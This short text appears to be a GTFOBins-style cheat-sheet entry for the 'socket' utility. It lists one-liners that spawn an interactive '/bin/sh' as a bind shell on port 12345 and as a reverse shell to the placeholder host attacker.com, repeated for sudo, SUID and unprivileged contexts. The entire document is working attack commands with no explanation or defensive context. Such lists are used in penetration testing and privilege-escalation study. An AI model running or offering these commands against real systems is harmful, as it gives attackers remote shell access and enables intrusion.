socket
======

Bind shell
----------

[Sudo]
    socket -svp '/bin/sh -i' 12345

[SUID]
    socket -svp '/bin/sh -i' 12345

[Unprivileged]
    socket -svp '/bin/sh -i' 12345

Reverse shell
-------------

[Sudo]
    socket -qvp '/bin/sh -i' attacker.com 12345

[SUID]
    socket -qvp '/bin/sh -i' attacker.com 12345

[Unprivileged]
    socket -qvp '/bin/sh -i' attacker.com 12345
